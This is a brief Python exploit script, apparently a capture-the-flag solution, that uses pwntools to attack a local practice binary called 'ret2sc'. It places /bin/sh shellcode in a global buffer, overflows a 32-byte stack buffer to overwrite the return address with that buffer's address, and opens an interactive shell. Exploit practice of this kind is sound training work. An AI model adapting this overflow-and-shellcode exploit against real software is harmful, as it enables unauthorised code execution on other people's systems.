#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = process('./ret2sc')
name = 0x804a060 # address of name (BSS) where we are going to placed return 
r.recvuntil(":")
r.sendline(asm(shellcraft.sh())) # /bin/shell shellcode which is 24 bytes
r.recvuntil(":")
payload = "a"*32 # buffer size 
payload += p32(name) # overflow return 
r.sendline(payload)

r.interactive()
